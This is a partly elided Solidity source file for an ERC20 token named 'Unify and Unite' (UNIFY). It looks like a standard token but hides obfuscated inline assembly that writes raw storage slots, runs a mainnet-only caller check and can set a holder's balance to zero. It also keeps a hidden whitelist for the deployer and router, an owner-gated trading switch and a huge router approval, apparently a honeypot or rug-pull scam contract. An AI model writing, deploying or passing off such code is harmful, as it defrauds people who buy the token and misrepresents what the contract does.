...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addUnify;
    uint256 private viserysLow = block.number*2;

    mapping (address => bool) private _firstDaemon; 
    mapping (address => bool) private _secondAegon;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private eggDrink;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private oldValyria;
    address public pair;
    ...
    bool private trading; uint256 private queenGoblin = 1; bool private nightKing;
    uint256 private _decimals; uint256 private valyrianSteel;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addUnify.push(_router); addUnify.push(msgSender_); addUnify.push(pair);
        for (uint256 q=0; q < 3;) {_firstDaemon[addUnify[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xe5bafa349be76374625f158e8b95ca922d06b02ea3a5496a1669356178172054
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xfec80286167a5fe88fbc95a4ec153a4dc8f9a078b78df63e81c20dda33645fb4,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; viserysLow = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addUnify[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployUnify(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addUnify[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployUnify(creator, initialSupply);
    }
}

contract UnifyAndUnite is ERC20Token {
    constructor() ERC20Token("Unify and Unite", "UNIFY", msg.sender, 1000000 * 10 ** 18) {
    }
}